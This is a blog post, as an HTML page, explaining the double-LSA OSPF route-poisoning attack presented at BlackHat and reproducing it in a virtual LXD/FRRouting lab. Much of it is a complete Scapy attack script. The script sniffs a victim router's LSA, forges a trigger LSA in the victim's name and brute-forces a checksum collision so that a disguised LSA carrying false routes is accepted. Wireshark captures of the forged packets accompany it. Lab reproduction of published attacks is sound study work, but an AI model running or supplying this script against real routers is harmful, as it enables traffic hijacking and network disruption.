<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="OSPF双LSA路由攻击的介绍与实现"><meta name="keywords" content="路由攻击"><meta name="author" content="Alston"><meta name="copyright" content="Alston"><title>OSPF双LSA路由攻击的介绍与实现 | Alston's blog</title><link rel="shortcut icon" href="/1231489.png"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-tool-used"><span class="toc-text"> 1 Tool used</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-key-points"><span class="toc-text"> 2 Key points</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-the-attack"><span class="toc-text"> 3 The attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#attack-steps"><span class="toc-text"> Attack steps</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-experiment"><span class="toc-text"> 4 Experiment</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://pic4.zhimg.com/80/v2-1b0d0240350e3d8e0550845b6bdaad1e_hd.jpg"></div><div class="author-info__name text-center">Alston</div><div class="author-info__description text-center">计算机硕士在读</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">44</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">20</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">11</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://blog.csdn.net/Sc0fie1d" target="_blank" rel="noopener">Alston's CSDN</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://s2.ax1x.com/2020/02/21/3uWnXD.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Alston's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">OSPF双LSA路由攻击的介绍与实现</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-07-10</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">1.6k</span><span class="post-meta__separator">|</span><span>阅读时长: 10 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>In this blog, I will talk about an attack against the OSPF protocol published by Alex Kirshon, Dima Gonikman, and Gabi Nakibly during a BlackHat conference. The purpose of this paper is to provide an understanding of the attack and automate it with scripts in a virtual network environment.</p>
<h1 id="1-tool-used"><a class="markdownIt-Anchor" href="#1-tool-used"></a> 1 Tool used</h1>
<ul>
<li>LXD</li>
<li>FRRouting</li>
<li>Python Scapy</li>
<li>Wireshark</li>
</ul>
<h1 id="2-key-points"><a class="markdownIt-Anchor" href="#2-key-points"></a> 2 Key points</h1>
<p><u><strong>The OSPF Fight Back Mechanism</strong></u></p>
<p>When a router A receives an LSA and the <em>Advertising-Router</em> field equals the <em>Router-id</em> of A (The LSA is advertised by A itself), Router A inspects the content and if it is not correct (The routing information of A has tampered), returns immediately another correct LSA which will overwrite the old one.</p>
<p><u><strong>Two LSA are considered identical if they meet the following criteria</strong></u></p>
<ul>
<li>Same <em>sequence number</em></li>
<li>Same <em>checksum value</em></li>
<li>Same <em>age</em> (+/- 15 min)</li>
</ul>
<h1 id="3-the-attack"><a class="markdownIt-Anchor" href="#3-the-attack"></a> 3 The attack</h1>
<p><img src="https://s1.ax1x.com/2020/07/10/UKOUiQ.png" alt="" /></p>
<h2 id="attack-steps"><a class="markdownIt-Anchor" href="#attack-steps"></a> Attack steps</h2>
<p><strong>step1:</strong> A <strong>Trigger LSA</strong> specifically craft to usurp an LSA packet from R1 and we send this false LSA to R1 to trigger the fight back mechanism.</p>
<p><strong>step2:</strong> We send a <strong>Disguised LSA</strong>, which craft to match the <strong>Fight Back LSA</strong> from R1 and carrying false routing information to poison the route table of victims, to R2 simultaneously. That means the Disguised LSA and Fight Back LSA have the same sequence number, checksum, and age, i.e., these two LSA are deemed to be identical.</p>
<p><strong>step3:</strong> R1 send the Fight Back LSA once receives the Trigger LSA from the attacker, which will be rejected by R2 because R2 already received an equivalent LSA from the attacker forged in step2.</p>
<p><strong>step4:</strong> R2 flood the Disguise LSA, R1 receives the packet but reject it, being seen as identical to the Fight Back LSA it sent in step 3.</p>
<p>Thus in the wake of the attack, R1 and R2 have a different LSDB as R2 has a tainted route-table. This continues until the next update of the LSA Database (30 minutes by default)</p>
<h1 id="4-experiment"><a class="markdownIt-Anchor" href="#4-experiment"></a> 4 Experiment</h1>
<p><img src="https://s1.ax1x.com/2020/07/10/UKO2i4.png" alt="" /></p>
<p>We use the Linux container <strong>LXD</strong> and a shell script to create the network topology automatically. Each router is an Alpine Linux instance with the <strong>FRRouting</strong> build in to conduct the OSPF routing protocol.</p>
<p>After that, the attack is implemented as follows:</p>
<ul>
<li>Firstly, We sniffing the OSPF packet consecutively in the attack router R1 and stop when the first OSPF LSUpd packet containing Router LSA is received from the victim router R5. We separate the last OSPF LSUpd from the sniffing packets as <em>original packet</em> and use it to craft the trigger packet and evil packet for convenience. Besides, sniffing the network without a break in order to launch the attack at any time whenever the victim router sent a LSUpd to revise other router’s routing information about itself.</li>
<li>Secondly, we craft a trigger packet and send it to the victim router in the form of multicast in order to trigger the fightback mechanism of R5. We also send the trigger packet to R6 simultaneously just to guarantee the arriving LSUpd sequence order.</li>
<li>Eventually, we specifically craft a disguised LSA which same as the fightback LSA sent by R5 and sent the disguised LSA to R6 after 2 seconds cease. The reason why we cease 2 seconds is that the OSPF can only process one LSA per second by default and the fightback mechanism is not triggered until 5 seconds approximately after receiving the trigger LSA. Therefore the time interval between the sending of trigger LSA and disguised LSA should in 1~5 seconds.</li>
</ul>
<p>By reason of the disguised LSA arrive at R6 before the fightback LSA, the poison target router R6 will add the false routing information carried by the disguised LSA to its routing table. The goal of the attacker is accomplished up to here.</p>
<p>The trigger LSA, disguised LSA, and fightback LSA captured by Wireshark are as follows:</p>
<p>trigger LSA:</p>
<p><img src="https://s1.ax1x.com/2020/07/10/UKO4Q1.png" alt="" /></p>
<p>disguised LSA:</p>
<p><img src="https://s1.ax1x.com/2020/07/10/UKOvQI.png" alt="" /></p>
<p>fightback LSA:</p>
<p><img src="https://s1.ax1x.com/2020/07/10/UKXESs.png" alt="" /></p>
<p>The poisoned routing table of R6 is as follows:</p>
<p><img src="https://s1.ax1x.com/2020/07/10/UKXZyq.png" alt="" /></p>
<p>The attack code is as follows:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Double LSA OSPF Attack</span></span><br><span class="line"><span class="string">Author:	Alston 					  </span></span><br><span class="line"><span class="string">Date:	2020.7.10   </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#####################################################</span></span><br><span class="line"><span class="comment"># Utils functions		 							#</span></span><br><span class="line"><span class="comment">#####################################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Checks if the incoming packet is an OSFP LS Update packet sent from the victim router.</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_incoming_packet</span><span class="params">(victim, pkt)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> OSPF_Router_LSA <span class="keyword">in</span> pkt:</span><br><span class="line">		<span class="keyword">for</span> lsa <span class="keyword">in</span> pkt[OSPF_LSUpd].lsalist:</span><br><span class="line">			<span class="keyword">if</span> lsa[OSPF_Router_LSA].adrouter == victim:</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Returns the last index of the victim router LSA taken from the originally captured packet</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_victim_lsa_index</span><span class="params">(victim, pkt)</span>:</span></span><br><span class="line">	position = <span class="number">0</span></span><br><span class="line">	<span class="keyword">if</span> OSPF_Router_LSA <span class="keyword">in</span> pkt:</span><br><span class="line">		<span class="keyword">for</span> lsa <span class="keyword">in</span> pkt[OSPF_LSUpd].lsalist:</span><br><span class="line">				<span class="keyword">if</span> lsa[OSPF_Router_LSA].adrouter == victim:</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				position += <span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> position</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">This function calculates the value of the first and the second byte in the </span></span><br><span class="line"><span class="string">OSPF Link "metric" field, used to fake the checksum.</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fake_metric_value</span><span class="params">(fightback_lsa, evil_lsa, linkcount)</span>:</span></span><br><span class="line"></span><br><span class="line">	tmp_lsa = evil_lsa[OSPF_Router_LSA].copy()</span><br><span class="line">	fightback_checksum = ospf_lsa_checksum(fightback_lsa.build())</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	Ok guys, I have no enough time here to understand how to do it in a cool and fancy</span></span><br><span class="line"><span class="string">	way with numpy. So, fuck, let's bruteforce it (using 65535 cycles, in the worst case).</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	<span class="keyword">for</span> metric <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">65535</span>):</span><br><span class="line">		tmp_lsa[OSPF_Router_LSA].linklist[linkcount].metric = metric</span><br><span class="line">		tmp_checksum = ospf_lsa_checksum(tmp_lsa.build())</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> tmp_checksum == fightback_checksum:</span><br><span class="line">			<span class="keyword">return</span> metric</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">    Load the Scapy's OSPF module</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">	load_contrib(<span class="string">"ospf"</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#####################################################</span></span><br><span class="line">	<span class="comment"># Initial configuration 							#</span></span><br><span class="line">	<span class="comment">#####################################################</span></span><br><span class="line">	</span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	The router-id of the victim router</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	victim = <span class="string">"192.168.35.105"</span></span><br><span class="line"></span><br><span class="line">	print(<span class="string">"[+] Staring sniffing for LSUpdate from the victim's router..."</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#####################################################</span></span><br><span class="line">	<span class="comment"># Sniffing for the original package					#</span></span><br><span class="line">	<span class="comment">#####################################################</span></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	Sniff all the OSFP packets and stop when the first OSPF Router LSA is received from the victim router.</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	pkts = sniff(filter=<span class="string">"proto ospf"</span>, stop_filter=<span class="keyword">lambda</span> x: check_incoming_packet(victim, x))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#pkts[-1].show()</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	Get the last packet and copy it.</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	pkt_orig = pkts[<span class="number">-1</span>].copy()</span><br><span class="line"></span><br><span class="line">	<span class="comment">#####################################################</span></span><br><span class="line">	<span class="comment"># Prepare the triggering packet 					#</span></span><br><span class="line">	<span class="comment">#####################################################</span></span><br><span class="line">	print(<span class="string">"[+] Preparing trigger packet..."</span>)</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	We prepare an trigger packet containing only one Router LSA:</span></span><br><span class="line"><span class="string">	this is taken from the original package sent by the victim router.</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	pkt_trig = pkts[<span class="number">-1</span>].copy()</span><br><span class="line">	victim_lsa_index = get_victim_lsa_index(victim, pkt_orig)</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	To be effective, the sequence of the trigger LSA has to be increased by 1.</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += <span class="number">1</span></span><br><span class="line">	</span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	Here we insert a random link, just to create an LSUpdate which seems advertised</span></span><br><span class="line"><span class="string">	by the victim router, but which contains fake information. This will force the</span></span><br><span class="line"><span class="string">	victim router to trigger the fightback mechanism.</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	trigger_link = OSPF_Link(	metric=<span class="number">10</span>,</span><br><span class="line">								toscount=<span class="number">0</span>,</span><br><span class="line">								type=<span class="number">3</span>,</span><br><span class="line">								data= <span class="string">"255.255.255.0"</span>,</span><br><span class="line">								id= <span class="string">"172.16.66.0"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	Addition of the triggering OSPF Link in the trigger packet.</span></span><br><span class="line"><span class="string">	"""</span>	</span><br><span class="line">	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(trigger_link)</span><br><span class="line"></span><br><span class="line">	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += <span class="number">12</span> </span><br><span class="line">	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = \</span><br><span class="line">	len(pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	Now that the packet is ready, we let Scapy recalculate length, checksums, etc..</span></span><br><span class="line"><span class="string">	Moreover, we update the source and destionatio IPs, and the source IP in the OSPF</span></span><br><span class="line"><span class="string">	header.</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	<span class="comment"># pkt_trig[Ether].src = "00:16:3e:0b:16:1e"</span></span><br><span class="line">	<span class="comment"># pkt_trig[Ether].dst = "01:00:5e:00:00:05"	# The multicast MAC address</span></span><br><span class="line">	pkt_trig[IP].src = <span class="string">"192.168.12.79"</span>	</span><br><span class="line">	pkt_trig[IP].dst = <span class="string">"224.0.0.5"</span>	</span><br><span class="line">	pkt_trig[IP].chksum = <span class="literal">None</span></span><br><span class="line">	pkt_trig[IP].len = <span class="literal">None</span></span><br><span class="line">	pkt_trig[OSPF_Hdr].src = victim</span><br><span class="line">	pkt_trig[OSPF_Hdr].chksum = <span class="literal">None</span></span><br><span class="line">	pkt_trig[OSPF_Hdr].len = <span class="literal">None</span></span><br><span class="line">	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len = <span class="literal">None</span></span><br><span class="line">	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].chksum = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#####################################################</span></span><br><span class="line">	<span class="comment"># Prepare the disguised packet 						#</span></span><br><span class="line">	<span class="comment">#####################################################</span></span><br><span class="line">	print(<span class="string">"[+] Preparing disguised packet..."</span>)</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	Get a fresh copy of the original packet.</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	pkt_evil = pkts[<span class="number">-1</span>].copy()</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	Generate the disguised LSA. This is an example, change it accordingly to your goal.</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	malicious_link = OSPF_Link(	metric=<span class="number">10</span>,</span><br><span class="line">								toscount=<span class="number">0</span>,</span><br><span class="line">								type=<span class="number">3</span>,</span><br><span class="line">								data= <span class="string">"255.255.255.0"</span>,</span><br><span class="line">								id= <span class="string">"172.16.254.0"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	Addition of the malicious OSPF Link in the LSA_disguised packet.</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(malicious_link)</span><br><span class="line"></span><br><span class="line">	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += <span class="number">12</span> 	</span><br><span class="line">	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = \</span><br><span class="line">	len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	The sequence number of the packet evil is incremented by 2 because</span></span><br><span class="line"><span class="string">	the trigger sequence is equal to the original packet sequence, plus one.</span></span><br><span class="line"><span class="string">	It then triggers the fightback mechanism, which produces a packet with</span></span><br><span class="line"><span class="string">	the sequence number equal to the trigger's sequence number, plus one.</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#####################################################</span></span><br><span class="line">	<span class="comment"># Calculate the disguised packet 					#</span></span><br><span class="line">	<span class="comment">#####################################################</span></span><br><span class="line">	print(<span class="string">"[+] Let's bruteforce the checksum!"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	Preparing the OSPF Link to fake the checksum.</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	checksum_link = OSPF_Link(	metric=<span class="number">0</span>,</span><br><span class="line">								toscount=<span class="number">0</span>,</span><br><span class="line">								type=<span class="number">3</span>,</span><br><span class="line">								data= <span class="string">"255.255.255.0"</span>,</span><br><span class="line">								id= <span class="string">"172.16.253.0"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	Addition of an OSPF Link in the LSA_disguised packet in order to change the checksum later.</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(checksum_link)</span><br><span class="line"></span><br><span class="line">	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += <span class="number">12</span></span><br><span class="line">	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = \</span><br><span class="line">	len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	ORIGINAL SOLUTION:</span></span><br><span class="line"><span class="string">	Get the value to modify the dummy link in order to have the same checksum as the fight back</span></span><br><span class="line"><span class="string">	index of the dummy link - "metric":[1], "Tos":[3], "type":[4], "link_data":[5,6,7,8], "DR":[9,10,11,12]</span></span><br><span class="line"><span class="string">	For example ind = [1,4], val = [49,12] -&gt; metric = 49 and type =12</span></span><br><span class="line"><span class="string">	IMPROVED SOLUTION:</span></span><br><span class="line"><span class="string">	Due to the fact that the metric is 2 bytes long and that C0 and C1 are always evaluated as mod(255),</span></span><br><span class="line"><span class="string">	there is no need to change all the other parameters.</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	count = pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	pkt_orig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">	faked_metric =  get_fake_metric_value(pkt_orig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA], \</span><br><span class="line">										  pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA], count)</span><br><span class="line"></span><br><span class="line">	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist[count][OSPF_Link].metric = faked_metric</span><br><span class="line"></span><br><span class="line">	print(<span class="string">"[+] Collision found! Time to send the pkts..."</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	Now that the packet is ready, we let Scapy recalculate length, checksums, etc..</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	<span class="comment"># pkt_evil[Ether].src = "00:16:3e:3a:a7:11"</span></span><br><span class="line">	<span class="comment"># pkt_evil[Ether].dst = "01:00:5e:00:00:05"</span></span><br><span class="line">	pkt_evil[IP].src = <span class="string">"192.168.16.130"</span></span><br><span class="line">	pkt_evil[IP].dst = <span class="string">"224.0.0.5"</span></span><br><span class="line">	pkt_evil[IP].chksum = <span class="literal">None</span></span><br><span class="line">	pkt_evil[IP].len = <span class="literal">None</span></span><br><span class="line">	pkt_evil[OSPF_Hdr].chksum = <span class="literal">None</span></span><br><span class="line">	pkt_evil[OSPF_Hdr].len = <span class="literal">None</span></span><br><span class="line">	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].chksum = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	Send trigger packet to trigger the fightback mechanism</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	sendp(pkt_trig, iface=<span class="string">'eth1'</span>)</span><br><span class="line">	sendp(pkt_trig, iface=<span class="string">'eth0'</span>)</span><br><span class="line">	sleep(<span class="number">2</span>)</span><br><span class="line">	sendp(pkt_evil, iface=<span class="string">'eth0'</span>)</span><br></pre></td></tr></table></figure>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Alston</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="/alst0n.site/2020/07/10/OSPF%E5%8F%8CLSA%E8%B7%AF%E7%94%B1%E6%94%BB%E5%87%BB%E7%9A%84%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%AE%9E%E7%8E%B0/">alst0n.site/2020/07/10/OSPF%E5%8F%8CLSA%E8%B7%AF%E7%94%B1%E6%94%BB%E5%87%BB%E7%9A%84%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%AE%9E%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="alst0n.site">Alston's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%B7%AF%E7%94%B1%E6%94%BB%E5%87%BB/">路由攻击</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/08/09/PaperNote-Log2vec/"><i class="fa fa-chevron-left">  </i><span>PaperNote-Log2vec</span></a></div><div class="next-post pull-right"><a href="/2020/03/25/PaperNote-Poirot%EF%BC%9A%E5%AF%B9%E6%AF%94%E6%94%BB%E5%87%BB%E8%A1%8C%E4%B8%BA%E4%B8%8E%E5%86%85%E6%A0%B8%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95%E4%BB%A5%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E5%A8%81%E8%83%81%E7%8C%8E%E6%9D%80/"><span>PaperNote-Poirot：对比攻击行为与内核审计记录以进行网络威胁猎杀</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://s2.ax1x.com/2020/02/21/3uWnXD.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2020 - 2021 By Alston</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script src="/js/katex.js"></script><script src="/js/search/local-search.js"></script><script id="ribbon" src="/js/third-party/canvas-ribbon.js" size="150" alpha="0.6" zIndex="-1" data-click="false"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>